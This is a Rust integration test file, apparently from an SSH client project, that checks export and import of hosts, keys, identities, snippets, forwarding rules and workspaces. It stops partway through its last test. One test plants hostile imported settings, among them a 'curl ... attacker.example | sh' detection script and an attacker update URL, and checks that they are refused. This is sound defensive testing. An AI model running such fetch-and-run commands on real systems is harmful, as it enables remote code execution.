//! The round trip of the native JSON export (SPEC principle 4;
//! docs/storage-format.md, sections 13.2 and 13.3; night decision D34),
//! the main test of the project's data ownership: export, import into a new
//! empty store, and every host, group, tag, key, identity, known host and
//! setting is the same, plain and encrypted. Then the merge rules: a second
//! import adds nothing, a conflicting record is kept as a suffixed copy,
//! wrong passwords and hostile files are refused. Snippets, their packages,
//! forwarding rules and workspaces come back with every reference between
//! them and to the hosts (D62, D63, D84). Every secret is generated at run
//! time.

mod common;
mod stage2;

use std::collections::BTreeMap;

use common::{first_run, reasons, save};
use secrecy::{ExposeSecret, SecretString};
use serde_json::{Value, json};
use shellpp_core::Core;
use shellpp_core::ValidationReason;
use shellpp_core::keys::generate::KeyKind;
use shellpp_core::model::identity::PasswordChange;
use shellpp_core::service::dto::{
    DataExportInput, DataImportInput, KeyGenerateInput, KnownHostAddInput, RecordType, RecordsRef,
    SettingsSetInput,
};
use shellpp_core::service::keychain::IdentitySaveInput;
use shellpp_core::service::last_session::SavedSession;
use shellpp_core::service::snippets::RecordInput;
use uuid::Uuid;

/// The record types an import takes, compared by the round trips.
const COMPARED: [&str; 9] = [
    "group",
    "host",
    "key",
    "identity",
    "known_host",
    "snippet_package",
    "snippet",
    "forwarding_rule",
    "workspace",
];

/// Content of a vault worth comparing: (type, record id) -> data, for the
/// types an import takes, and the settings. Read from a plain export.
type Content = (BTreeMap<(String, String), Value>, Value);

fn content(core: &Core) -> Content {
    let export = core
        .data_export(DataExportInput::default())
        .expect("export");
    let document: Value = serde_json::from_str(export.text.expose_secret()).expect("json");
    assert_eq!(document["format"], "shellpp.export.v1");
    let mut records = BTreeMap::new();
    for record in document["vaults"][0]["records"]
        .as_array()
        .expect("records")
    {
        let kind = record["type"].as_str().unwrap().to_owned();
        if COMPARED.contains(&kind.as_str()) {
            let id = record["record_id"].as_str().unwrap().to_owned();
            records.insert((kind, id), record["data"].clone());
        }
    }
    (records, document["settings"].clone())
}

/// A store with some of everything, secrets included.
fn populated() -> common::Unlocked {
    let u = first_run();
    let vault = u.vault_id;
    let prod = save(
        &u.core,
        vault,
        None,
        RecordType::Group,
        json!({"name": "prod", "ssh": {"username": "deploy", "port": 2222}}),
        &[],
    )
    .expect("group");
    let web = save(
        &u.core,
        vault,
        None,
        RecordType::Group,
        json!({"name": "web", "parent_id": prod.record_id().to_string()}),
        &[],
    )
    .expect("nested group");
    let key = u
        .core
        .key_generate(KeyGenerateInput {
            vault_id: vault,
            label: "deploy key".to_owned(),
            kind: KeyKind::Ed25519,
            passphrase: Some(stage2::passphrase()),
            save_passphrase: true,
        })
        .expect("key")
        .key;
    let identity = u
        .core
        .identity_save(IdentitySaveInput {
            vault_id: vault,
            record_id: None,
            label: "ops".to_owned(),
            username: "ops".to_owned(),
            key_id: Some(key.record_id),
            password: PasswordChange::Set(SecretString::from(format!(
                "pw-{}",
                common::random_hex()
            ))),
        })
        .expect("identity");
    let password = format!("pw-{}", common::random_hex());
    let web1 = save(
        &u.core,
        vault,
        None,
        RecordType::Host,
        json!({
            "label": "web-1",
            "address": "web1.example.com",
            "group_id": web.record_id().to_string(),
            "tags": ["prod", "web"],
            "color": "ocean",
            "notes": "the first web server",
            "ssh": {"port": 2200}
        }),
        &[("ssh.password", Some(password.as_str()))],
    )
    .expect("host with password");
    // A detected OS (a member a save never takes from its input).
    let detected =
        shellpp_core::os_detect::from_banner("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13").expect("os");
    assert!(
        u.core
            .host_os_detected(
                shellpp_core::service::dto::RecordRef {
                    vault_id: vault,
                    record_id: web1.record_id(),
                },
                detected,
                shellpp_core::service::dto::OsSource::Banner,
            )
            .expect("os saved")
    );
    save(
        &u.core,
        vault,
        None,
        RecordType::Host,
        json!({
            "label": "db",
            "address": "192.0.2.44",
            "tags": ["prod"],
            "ssh": {"identity_id": identity.record_id.to_string()}
        }),
        &[],
    )
    .expect("host with identity");
    let key_blob = {
        let key = stage2::generate(stage2::KeyKind::Ed25519, "");
        let line = key.public_key().to_openssh().unwrap();
        line.split_whitespace().nth(1).unwrap().to_owned()
    };
    u.core
        .known_host_add(KnownHostAddInput {
            host: "web1.example.com".to_owned(),
            port: Some(2200),
            key_type: "ssh-ed25519".to_owned(),
            public_key: key_blob,
            revoked: false,
            comment: None,
        })
        .expect("known host");
    u.core
        .settings_set(SettingsSetInput {
            values: BTreeMap::from([
                ("terminal.copy_on_select".to_owned(), json!(true)),
                ("terminal.bell_sound".to_owned(), json!(true)),
            ]),
            reset: Vec::new(),
        })
        .expect("settings");
    u
}

fn record_input(u: &common::Unlocked, record_id: Option<Uuid>, data: Value) -> RecordInput {
    RecordInput {
        vault_id: u.vault_id,
        record_id,
        data: common::map(data),
    }
}

/// The id of the record of `kind` whose `member` is `value`.
fn id_of(core: &Core, kind: &str, member: &str, value: &str) -> Uuid {
    content(core)
        .0
        .into_iter()
        .find(|((record_kind, _), data)| record_kind == kind && data[member] == value)
        .map(|((_, id), _)| Uuid::parse_str(&id).unwrap())
        .unwrap_or_else(|| panic!("no {kind} with {member} {value}"))
}

/// [`populated`] with a snippet package, a snippet in it that targets web-1,
/// a snippet that is db's startup snippet, and two forwarding rules of db
/// that start on connect and on launch: a loopback tunnel and a SOCKS proxy
/// on every interface.
fn with_snippets() -> common::Unlocked {
    let u = populated();
    let web1 = id_of(&u.core, "host", "label", "web-1");
    let db = id_of(&u.core, "host", "label", "db");
    let package = u
        .core
        .snippet_package_save(record_input(&u, None, json!({"name": "Deploy"})))
        .expect("package");
    u.core
        .snippet_save(record_input(
            &u,
            None,
            json!({
                "label": "restart",
                "script": "sudo systemctl restart {{service}}",
                "package_id": package.record.record_id.to_string(),
                "tags": ["ops"],
                "target_host_ids": [web1.to_string()]
            }),
        ))
        .expect("snippet in a package");
    let startup = u
        .core
        .snippet_save(record_input(
            &u,
            None,
            json!({"label": "motd", "script": "uptime"}),
        ))
        .expect("startup snippet");
    let mut data = content(&u.core).0[&("host".to_owned(), db.to_string())].clone();
    data["ssh"]["startup_snippet_id"] = json!(startup.record.record_id.to_string());
    save(&u.core, u.vault_id, Some(db), RecordType::Host, data, &[]).expect("startup link");
    u.core
        .forwarding_rule_save(record_input(
            &u,
            None,
            json!({
                "type": "local",
                "host_id": db.to_string(),
                "label": "db tunnel",
                "bind_port": 15432,
                "dest_address": "db.internal",
                "dest_port": 5432,
                "autostart_on_connect": true,
                "autostart_on_launch": true
            }),
        ))
        .expect("loopback rule");
    u.core
        .forwarding_rule_save(record_input(
            &u,
            None,
            json!({
                "type": "dynamic",
                "host_id": db.to_string(),
                "label": "lab socks",
                "bind_address": "0.0.0.0",
                "bind_port": 1080,
                "autostart_on_connect": true,
                "autostart_on_launch": true
            }),
        ))
        .expect("rule on every interface");
    u
}

fn import(
    core: &Core,
    text: &SecretString,
    password: Option<&str>,
) -> shellpp_core::service::dto::DataImportSummary {
    core.data_import(DataImportInput::new(
        text.clone(),
        password.map(|value| SecretString::from(value.to_owned())),
    ))
    .expect("import")
}

#[test]
fn plain_and_encrypted_exports_round_trip_into_an_empty_store() {
    let source = populated();
    let expected = content(&source.core);
    let counted = expected.0.len();
    assert_eq!(
        counted, 7,
        "2 groups, 1 key, 1 identity, 2 hosts, 1 known host"
    );

    let plain = source
        .core
        .data_export(DataExportInput::default())
        .expect("plain export");
    assert!(!plain.encrypted);
    assert!(plain.file_name.starts_with("shellpp-export-"));
    assert!(plain.file_name.ends_with(".json"));
    assert!(!plain.file_name.ends_with(".encrypted.json"));

    let export_password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(export_password.clone())),
            ..DataExportInput::default()
        })
        .expect("encrypted export");
    assert!(encrypted.encrypted);
    assert!(encrypted.file_name.ends_with(".encrypted.json"));
    // Nothing of the content is in the clear.
    let outer: Value = serde_json::from_str(encrypted.text.expose_secret()).unwrap();
    assert_eq!(outer["format"], "shellpp.export.encrypted.v1");
    assert!(!encrypted.text.expose_secret().contains("web1.example.com"));
    assert!(!encrypted.text.expose_secret().contains("deploy key"));

    for (text, password) in [
        (&plain.text, None),
        (&encrypted.text, Some(export_password.as_str())),
    ] {
        let target = first_run();
        let summary = import(&target.core, text, password);
        assert_eq!(summary.added, counted);
        assert_eq!(summary.existing, 0);
        assert_eq!(summary.conflicts, 0);
        assert!(summary.refused.is_empty(), "{:?}", summary.refused);
        assert!(summary.settings > 0);
        let actual = content(&target.core);
        assert_eq!(
            actual.0, expected.0,
            "records (secrets included) are the same"
        );
        assert_eq!(actual.1, expected.1, "settings are the same");
        // The key still opens with its saved passphrase and has its
        // fingerprint; the identity still links it.
        let keys = target.core.keys_list().unwrap();
        assert_eq!(keys.len(), 1);
        assert!(keys[0].passphrase_saved);
        assert_eq!(
            keys[0].fingerprint,
            source.core.keys_list().unwrap()[0].fingerprint
        );
        let identities = target.core.identities_list().unwrap();
        assert_eq!(identities[0].key_id, Some(keys[0].record_id));
        assert_eq!(target.core.known_hosts_list().unwrap().len(), 1);
    }
}

#[test]
fn a_second_import_adds_nothing_and_a_conflict_keeps_both_versions() {
    let source = populated();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    assert_eq!(import(&target.core, &export.text, None).added, 7);
    let again = import(&target.core, &export.text, None);
    assert_eq!(again.added, 0);
    assert_eq!(again.existing, 7);
    assert_eq!(again.conflicts, 0);

    // The host "db" changes here; the next import keeps it and adds the
    // exported version as a suffixed copy.
    let (records, _) = content(&target.core);
    let ((_, db_id), db) = records
        .iter()
        .find(|((kind, _), data)| kind == "host" && data["label"] == "db")
        .unwrap();
    let db_id = Uuid::parse_str(db_id).unwrap();
    let mut changed = db.clone();
    changed["notes"] = json!("changed after the export");
    save(
        &target.core,
        target.vault_id,
        Some(db_id),
        RecordType::Host,
        changed,
        &[],
    )
    .unwrap();
    let third = import(&target.core, &export.text, None);
    assert_eq!(third.conflicts, 1);
    assert_eq!(third.existing, 6);
    let (records, _) = content(&target.core);
    let hosts: Vec<&Value> = records
        .iter()
        .filter(|((kind, _), _)| kind == "host")
        .map(|(_, data)| data)
        .collect();
    assert_eq!(hosts.len(), 3);
    assert!(
        hosts
            .iter()
            .any(|host| host["label"] == "db" && host["notes"] == "changed after the export")
    );
    assert!(hosts.iter().any(|host| host["label"] == "db (imported)"));
    // The local one is unchanged under its id.
    assert_eq!(
        records[&("host".to_owned(), db_id.to_string())]["notes"],
        "changed after the export"
    );

    // The same file once more: the copy is found by its import key
    // (`json:<exported id>`, data-model 18.4), no second copy is made.
    let fourth = import(&target.core, &export.text, None);
    assert_eq!(fourth.conflicts, 0);
    assert_eq!(fourth.added, 0);
    assert_eq!(fourth.existing, 7);
    let (records, _) = content(&target.core);
    let copies: Vec<&Value> = records
        .iter()
        .filter(|((kind, _), data)| kind == "host" && data["label"] == "db (imported)")
        .map(|(_, data)| data)
        .collect();
    assert_eq!(copies.len(), 1);
    assert_eq!(copies[0]["import_key"], format!("json:{db_id}"));
}

#[test]
fn a_key_found_under_another_id_keeps_the_references_to_it() {
    let source = populated();
    let key_id = source.core.keys_list().unwrap()[0].record_id;
    let keyed = save(
        &source.core,
        source.vault_id,
        None,
        RecordType::Group,
        json!({"name": "keyed", "ssh": {"key_id": key_id.to_string()}}),
        &[],
    )
    .expect("group with a key");
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    assert_eq!(import(&target.core, &export.text, None).added, 8);

    // The same key under another id (imported on its own on another
    // device), named by a group that is new here.
    let other_key = Uuid::now_v7();
    let new_group = Uuid::now_v7();
    let text = export
        .text
        .expose_secret()
        .replace(&key_id.to_string(), &other_key.to_string())
        .replace(&keyed.record_id().to_string(), &new_group.to_string());
    let summary = import(&target.core, &SecretString::from(text), None);
    assert_eq!(summary.added, 1, "only the group is new");
    assert_eq!(
        summary.conflicts, 0,
        "records that name the key are the same once it is the local one"
    );
    let (records, _) = content(&target.core);
    let group = &records[&("group".to_owned(), new_group.to_string())];
    assert_eq!(group["ssh"]["key_id"], key_id.to_string());
    assert!(
        !records.contains_key(&("key".to_owned(), other_key.to_string())),
        "the key stays local"
    );
}

#[test]
fn settings_that_run_or_open_something_never_come_from_a_file() {
    let source = populated();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let mut document: Value = serde_json::from_str(export.text.expose_secret()).unwrap();
    // A shared "host list" that also carries settings (security.md TB7).
    let hostile = [
        (
            "terminal.os_detection_script",
            json!("curl -s https://attacker.example/x | sh"),
        ),
        ("terminal.os_detection_enabled", json!(false)),
        ("terminal.local_shell", json!("/opt/attacker/shell")),
        ("sftp.open_program", json!("attacker-open")),
        (
            "updates.manifest_url",
            json!("https://attacker.example/manifest.json"),
        ),
        ("updates.auto_check", json!(true)),
        ("security.auto_lock_minutes", json!(1440)),
        ("logs.record_output", json!(true)),
        ("logs.retention_days", json!(1)),
        ("terminal.record_history", json!(false)),
        ("terminal.import_shell_history", json!(true)),
        ("terminal.confirm_multiline_paste", json!(false)),
        ("sftp.confirm_delete", json!(false)),
        ("sftp.name_conflict", json!("replace")),
    ];
    for (key, value) in &hostile {
        document["settings"][*key] = value.clone();
    }
    document["settings"]["terminal.font_size"] = json!(18);
    let target = first_run();
    let defaults = content(&target.core).1;
    let summary = import(
        &target.core,
        &SecretString::from(document.to_string()),
        None,
    );
    assert_eq!(summary.settings_left_out, hostile.len());
    let settings = content(&target.core).1;
    for (key, _) in &hostile {
        assert_eq!(settings[*key], defaults[*key], "{key} stays as it was");
    }
    assert_eq!(settings["terminal.font_size"], 18, "the look comes along");
    assert_eq!(settings["terminal.copy_on_select"], true);
}

#[test]
fn wrong_passwords_and_hostile_files_are_refused() {
    let source = populated();
    let password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(password.clone())),
            ..DataExportInput::default()
        })
        .unwrap();
    let target = first_run();
    let attempt = |text: &str, password: Option<&str>| {
        target.core.data_import(DataImportInput::new(
            SecretString::from(text.to_owned()),
            password.map(|value| SecretString::from(value.to_owned())),
        ))
    };
    assert_eq!(
        reasons(attempt(encrypted.text.expose_secret(), None).unwrap_err()),
        vec![("password".to_owned(), ValidationReason::Required)]
    );
    assert_eq!(
        reasons(attempt(encrypted.text.expose_secret(), Some("wrong password")).unwrap_err()),
        vec![("password".to_owned(), ValidationReason::Invalid)]
    );
    // KDF parameters below the floor: refused before deriving.
    let mut weak: Value = serde_json::from_str(encrypted.text.expose_secret()).unwrap();
    weak["kdf"]["m_kib"] = json!(8);
    assert_eq!(
        reasons(attempt(&weak.to_string(), Some(&password)).unwrap_err()),
        vec![("text".to_owned(), ValidationReason::NotAllowed)]
    );
    // Not an export.
    for text in ["", "not json", "[]", r#"{"format":"other"}"#] {
        assert_eq!(
            reasons(attempt(text, None).unwrap_err()),
            vec![("text".to_owned(), ValidationReason::Invalid)],
            "{text}"
        );
    }
    // Too short an export password.
    assert_eq!(
        reasons(
            source
                .core
                .data_export(DataExportInput {
                    password: Some(SecretString::from("short".to_owned())),
                    ..DataExportInput::default()
                })
                .unwrap_err()
        ),
        vec![("password".to_owned(), ValidationReason::TooShort)]
    );
    // A record that breaks the rules is refused with its errors; the others
    // are imported.
    let plain = source.core.data_export(DataExportInput::default()).unwrap();
    let mut document: Value = serde_json::from_str(plain.text.expose_secret()).unwrap();
    let records = document["vaults"][0]["records"].as_array_mut().unwrap();
    let bad = records
        .iter_mut()
        .find(|record| record["type"] == "host" && record["data"]["label"] == "db")
        .unwrap();
    bad["data"]["ssh"]["port"] = json!(70000);
    records.push(json!({
        "record_id": Uuid::now_v7().to_string(),
        "type": "snippet_of_the_future",
        "data": {}
    }));
    let summary = target
        .core
        .data_import(DataImportInput {
            apply_settings: false,
            ..DataImportInput::new(SecretString::from(document.to_string()), None)
        })
        .unwrap();
    assert_eq!(summary.refused.len(), 1);
    assert_eq!(summary.refused[0].record_type, "host");
    assert!(summary.skipped >= 1, "unknown types are skipped");
    assert_eq!(summary.settings, 0, "settings left alone on request");
    assert!(summary.added >= 6);
}

/// A copy from an earlier import is matched only while it holds the same
/// (D41): a newer version of the record in a later export is imported as
/// another copy instead of being taken for the old one.
#[test]
fn a_newer_version_of_a_copied_record_is_not_dropped() {
    let source = populated();
    let first = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    import(&target.core, &first.text, None);
    let db_id = |core: &Core| {
        content(core)
            .0
            .into_iter()
            .find(|((kind, _), data)| kind == "host" && data["label"] == "db")
            .map(|((_, id), data)| (Uuid::parse_str(&id).unwrap(), data))
            .unwrap()
    };
    // Changed on both sides: the first copy.
    let (id, mut data) = db_id(&target.core);
    data["notes"] = json!("changed here");
    save(
        &target.core,
        target.vault_id,
        Some(id),
        RecordType::Host,
        data,
        &[],
    )
    .unwrap();
    assert_eq!(import(&target.core, &first.text, None).conflicts, 1);
    // The source changes it again: its next export is not the old copy.
    let (id, mut data) = db_id(&source.core);
    data["address"] = json!("192.0.2.45");
    save(
        &source.core,
        source.vault_id,
        Some(id),
        RecordType::Host,
        data,
        &[],
    )
    .unwrap();
    let second = source.core.data_export(DataExportInput::default()).unwrap();
    let summary = import(&target.core, &second.text, None);
    assert_eq!(summary.conflicts, 1, "the newer version is kept as a copy");
    let addresses: Vec<String> = content(&target.core)
        .0
        .into_iter()
        .filter(|((kind, _), _)| kind == "host")
        .filter_map(|(_, data)| data["address"].as_str().map(str::to_owned))
        .collect();
    assert!(
        addresses.contains(&"192.0.2.45".to_owned()),
        "{addresses:?}"
    );
    // And that file once more adds nothing.
    assert_eq!(import(&target.core, &second.text, None).conflicts, 0);
}

/// A record that names a record copied by an earlier import is the same
/// once that copy is found, whatever the order of their types: no copy of
/// it on the next import of the same file.
#[test]
fn records_that_name_a_copied_record_are_not_copied_again() {
    let source = populated();
    let first = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    import(&target.core, &first.text, None);
    // The identity changes here, then the source adds a group that names it.
    let identity = target.core.identities_list().unwrap()[0].clone();
    target
        .core
        .identity_save(IdentitySaveInput {
            vault_id: target.vault_id,
            record_id: Some(identity.record_id),
            label: "ops here".to_owned(),
            username: "ops".to_owned(),
            key_id: identity.key_id,
            password: PasswordChange::Keep,
        })
        .unwrap();
    save(
        &source.core,
        source.vault_id,
        None,
        RecordType::Group,
        json!({"name": "by identity", "ssh": {"identity_id": identity.record_id.to_string()}}),
        &[],
    )
    .unwrap();
    let second = source.core.data_export(DataExportInput::default()).unwrap();
    let summary = import(&target.core, &second.text, None);
    assert_eq!(summary.conflicts, 1, "the identity");
    assert_eq!(
        summary.added, 1,
        "the group, pointing to the identity's copy"
    );
    let again = import(&target.core, &second.text, None);
    assert_eq!(again.conflicts, 0, "{again:?}");
    assert_eq!(again.added, 0);
    let groups = content(&target.core)
        .0
        .into_iter()
        .filter(|((kind, _), data)| kind == "group" && data["name"] == "by identity (imported)")
        .count();
    assert_eq!(groups, 0);
}

/// Snippets, packages and forwarding rules come back with every reference
/// between them and to the hosts (D62), from a plain and from an encrypted
/// file. A full restore keeps every rule as it was; on an ordinary import no
/// rule starts on launch and the one beyond loopback not on connect either
/// (D63), and the same file again finds every record.
#[test]
fn snippets_packages_and_rules_round_trip_with_their_references() {
    let source = with_snippets();
    let expected = content(&source.core);
    let count = |kind: &str| expected.0.keys().filter(|(k, _)| k == kind).count();
    assert_eq!(
        (
            count("snippet_package"),
            count("snippet"),
            count("forwarding_rule")
        ),
        (1, 2, 2)
    );
    let wide = id_of(&source.core, "forwarding_rule", "label", "lab socks");
    let tunnel = id_of(&source.core, "forwarding_rule", "label", "db tunnel");
    let plain = source.core.data_export(DataExportInput::default()).unwrap();
    let export_password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(export_password.clone())),
            ..DataExportInput::default()
        })
        .unwrap();
    assert!(!encrypted.text.expose_secret().contains("systemctl"));

    for (text, password) in [
        (&plain.text, None),
        (&encrypted.text, Some(export_password.as_str())),
    ] {
        let secret = |value: &str| SecretString::from(value.to_owned());
        // A full restore: everything as it was.
        let target = first_run();
        let summary = target
            .core
            .data_import(DataImportInput {
                full_restore: true,
                ..DataImportInput::new(text.clone(), password.map(secret))
            })
            .unwrap();
        assert!(summary.refused.is_empty(), "{:?}", summary.refused);
        assert_eq!(summary.added, expected.0.len());
        assert_eq!(summary.rules_autostart_off, 0);
        assert_eq!(content(&target.core).0, expected.0);
        // The references read through the services here.
        let package = id_of(&target.core, "snippet_package", "name", "Deploy");
        let web1 = id_of(&target.core, "host", "label", "web-1");
        let db = id_of(&target.core, "host", "label", "db");
        let snippets = target.core.snippets_list(target.vault_id).unwrap();
        let restart = snippets
            .iter()
            .find(|view| view.label.as_deref() == Some("restart"))
            .unwrap();
        assert_eq!(restart.package_id, Some(package));
        assert_eq!(restart.target_host_ids, vec![web1]);
        assert_eq!(restart.variables, vec!["service".to_owned()]);
        let motd = id_of(&target.core, "snippet", "label", "motd");
        assert_eq!(
            content(&target.core).0[&("host".to_owned(), db.to_string())]["ssh"]["startup_snippet_id"],
            motd.to_string()
        );
        let rules = target.core.forwarding_rules_personal().unwrap();
        assert_eq!(rules.len(), 2);
        assert!(rules.iter().all(|rule| rule.host_id == db), "{rules:?}");

        // An ordinary import: the same, except the autostart of the rules.
        let target = first_run();
        let summary = import(&target.core, text, password);
        assert!(summary.refused.is_empty(), "{:?}", summary.refused);
        assert_eq!(summary.added, expected.0.len());
        assert_eq!(summary.rules_autostart_off, 2);
        let mut wanted = expected.0.clone();
        let rule = |wanted: &BTreeMap<(String, String), Value>, id: Uuid| {
            wanted[&("forwarding_rule".to_owned(), id.to_string())].clone()
        };
        let mut socks = rule(&wanted, wide);
        socks["autostart_on_connect"] = json!(false);
        socks["autostart_on_launch"] = json!(false);
        wanted.insert(("forwarding_rule".to_owned(), wide.to_string()), socks);
        let mut loopback = rule(&wanted, tunnel);
        loopback["autostart_on_launch"] = json!(false);
        wanted.insert(("forwarding_rule".to_owned(), tunnel.to_string()), loopback);
        assert_eq!(content(&target.core).0, wanted);
        // The same file again adds and copies nothing.
        let again = import(&target.core, text, password);
        assert_eq!(
            (again.added, again.conflicts, again.existing),
            (0, 0, expected.0.len()),
            "{again:?}"
        );
        assert_eq!(again.rules_autostart_off, 0);
    }
}

/// A package, a snippet, a host and a rule changed here are conflicts: the
/// imported copies get the suffix, and the copies of the snippet and the
/// rule point to the copies of the package and the host. A record of the
/// file that is the same as here stays "existing", with its references to
/// the local records (D34). The next import of the same file finds the
/// copies.
#[test]
fn conflicting_snippets_and_rules_point_to_the_imported_copies() {
    let source = with_snippets();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    let total = import(&target.core, &export.text, None).added;
    let package = id_of(&target.core, "snippet_package", "name", "Deploy");
    target
        .core
        .snippet_package_save(record_input(
            &target,
            Some(package),
            json!({"name": "Deploy here"}),
        ))
        .unwrap();
    let restart = id_of(&target.core, "snippet", "label", "restart");
    let mut snippet = content(&target.core).0[&("snippet".to_owned(), restart.to_string())].clone();
    snippet["script"] = json!("sudo systemctl reload {{service}}");
    target
        .core
        .snippet_save(record_input(&target, Some(restart), snippet))
        .unwrap();
    let db = id_of(&target.core, "host", "label", "db");
    let mut data = content(&target.core).0[&("host".to_owned(), db.to_string())].clone();
    data["notes"] = json!("changed here");
    save(
        &target.core,
        target.vault_id,
        Some(db),
        RecordType::Host,
        data,
        &[],
    )
    .unwrap();
    let tunnel = id_of(&target.core, "forwarding_rule", "label", "db tunnel");
    let mut rule =
        content(&target.core).0[&("forwarding_rule".to_owned(), tunnel.to_string())].clone();
    rule["bind_port"] = json!(25432);
    target
        .core
        .forwarding_rule_save(record_input(&target, Some(tunnel), rule))
        .unwrap();

    let summary = import(&target.core, &export.text, None);
    assert_eq!(summary.conflicts, 4, "{summary:?}");
    assert_eq!(summary.existing, total - 4);
    let package_copy = id_of(&target.core, "snippet_package", "name", "Deploy (imported)");
    let db_copy = id_of(&target.core, "host", "label", "db (imported)");
    let records = content(&target.core).0;
    let record = |kind: &str, label: &str| {
        records[&(
            kind.to_owned(),
            id_of(&target.core, kind, "label", label).to_string(),
        )]
            .clone()
    };
    let snippet_copy = record("snippet", "restart (imported)");
    assert_eq!(snippet_copy["package_id"], package_copy.to_string());
    assert_eq!(snippet_copy["script"], "sudo systemctl restart {{service}}");
    assert_eq!(snippet_copy["import_key"], format!("json:{restart}"));
    let rule_copy = record("forwarding_rule", "db tunnel (imported)");
    assert_eq!(rule_copy["host_id"], db_copy.to_string());
    assert_eq!(rule_copy["bind_port"], 15432);
    // The local records keep their own references.
    assert_eq!(
        record("snippet", "restart")["package_id"],
        package.to_string()
    );
    assert_eq!(
        record("forwarding_rule", "db tunnel")["host_id"],
        db.to_string()
    );
    assert_eq!(
        record("forwarding_rule", "lab socks")["host_id"],
        db.to_string()
    );

    let again = import(&target.core, &export.text, None);
    assert_eq!((again.added, again.conflicts), (0, 0), "{again:?}");
}

/// The export of a profile imported into that same profile: every record
/// already exists, rules whose autostart an ordinary import would turn off
/// included; nothing is copied and the local flags stay (D34, D63).
#[test]
fn a_profile_imports_its_own_export_without_copies() {
    let source = with_snippets();
    let before = content(&source.core).0;
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let summary = import(&source.core, &export.text, None);
    assert_eq!(
        (summary.added, summary.conflicts, summary.existing),
        (0, 0, before.len()),
        "{summary:?}"
    );
    assert_eq!(summary.rules_autostart_off, 0);
    assert_eq!(content(&source.core).0, before);
}

/// [`with_snippets`] with two workspaces: "Prod" (web-1 in one tab, db and
/// a local terminal side by side in a tab named "db") and "DB only".
fn with_workspaces() -> common::Unlocked {
    let u = with_snippets();
    let web1 = id_of(&u.core, "host", "label", "web-1");
    let db = id_of(&u.core, "host", "label", "db");
    let link = |id: Uuid| json!({"vault_id": u.vault_id.to_string(), "record_id": id.to_string()});
    for data in [
        json!({
            "name": "Prod",
            "tabs": [
                {"root": {"session": {"kind": "ssh", "host": link(web1)}}},
                {"title": "db", "root": {"direction": "row", "sizes": [0.5, 0.5], "children": [
                    {"session": {"kind": "ssh", "host": link(db)}},
                    {"session": {"kind": "local"}}
                ]}}
            ]
        }),
        json!({"name": "DB only", "tabs": [{"root": {"session": {"kind": "ssh", "host": link(db)}}}]}),
    ] {
        u.core
            .workspace_save(record_input(&u, None, data))
            .expect("workspace");
    }
    u
}

/// The host links of the panes of workspace `name`, in order: (vault,
/// host); `None` for a local terminal.
fn workspace_links(core: &Core, vault: Uuid, name: &str) -> Vec<Option<(Uuid, Uuid)>> {
    let workspace = core
        .workspaces_list(vault)
        .unwrap()
        .into_iter()
        .find(|workspace| workspace.name == name)
        .unwrap_or_else(|| panic!("no workspace {name}"));
    workspace
        .tabs
        .iter()
        .flat_map(|tab| tab.root.sessions())
        .map(|session| match session {
            SavedSession::Host(link) => Some((link.vault_id, link.record_id)),
            _ => None,
        })
        .collect()
}

/// Workspaces come back with their tabs, titles and splits, their host
/// links on the hosts of the vault here, plain and encrypted; the same
/// file again adds nothing (D84).
#[test]
fn workspaces_round_trip_with_their_host_links() {
    let source = with_workspaces();
    let expected = content(&source.core).0;
    let plain = source.core.data_export(DataExportInput::default()).unwrap();
    let export_password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(export_password.clone())),
            ..DataExportInput::default()
        })
        .unwrap();
    for (text, password) in [
        (&plain.text, None),
        (&encrypted.text, Some(export_password.as_str())),
    ] {
        let target = first_run();
        let summary = import(&target.core, text, password);
        assert!(summary.refused.is_empty(), "{:?}", summary.refused);
        assert_eq!(summary.added, expected.len());
        let vault = target.vault_id;
        let web1 = id_of(&target.core, "host", "label", "web-1");
        let db = id_of(&target.core, "host", "label", "db");
        assert_eq!(
            workspace_links(&target.core, vault, "Prod"),
            vec![Some((vault, web1)), Some((vault, db)), None]
        );
        assert_eq!(
            workspace_links(&target.core, vault, "DB only"),
            vec![Some((vault, db))]
        );
        // Each workspace record whole: the tabs, titles, split direction and
        // sizes, with the links on the vault here.
        let here = content(&target.core).0;
        for ((kind, id), data) in &expected {
            if kind != "workspace" {
                continue;
            }
            let moved: Value = serde_json::from_str(
                &data
                    .to_string()
                    .replace(&source.vault_id.to_string(), &vault.to_string()),
            )
            .unwrap();
            assert_eq!(here[&(kind.clone(), id.clone())], moved);
        }
        let again = import(&target.core, text, password);
        assert_eq!(
            (again.added, again.conflicts, again.existing),
            (0, 0, expected.len()),
            "{again:?}"
        );
    }
}

/// A host changed here is a conflict, and so is a workspace renamed here:
/// the copy of the workspace gets the suffix and the import key and links
/// the copy of the host, as a workspace of the file that is new here does;
/// the workspace here keeps its own links. The next import finds the
/// copies (D34, D84).
#[test]
fn conflicting_workspaces_link_the_imported_copies() {
    let source = with_workspaces();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    let vault = target.vault_id;
    import(&target.core, &export.text, None);
    let web1 = id_of(&target.core, "host", "label", "web-1");
    let db = id_of(&target.core, "host", "label", "db");
    let mut data = content(&target.core).0[&("host".to_owned(), db.to_string())].clone();
    data["notes"] = json!("changed here");
    save(&target.core, vault, Some(db), RecordType::Host, data, &[]).unwrap();
    let prod = id_of(&target.core, "workspace", "name", "Prod");
    let mut workspace =
        content(&target.core).0[&("workspace".to_owned(), prod.to_string())].clone();
    workspace["name"] = json!("Prod here");
    target
        .core
        .workspace_save(record_input(&target, Some(prod), workspace))
        .unwrap();
    let db_only = id_of(&target.core, "workspace", "name", "DB only");
    target
        .core
        .record_delete(RecordsRef {
            vault_id: vault,
            record_ids: vec![db_only],
        })
        .unwrap();

    let summary = import(&target.core, &export.text, None);
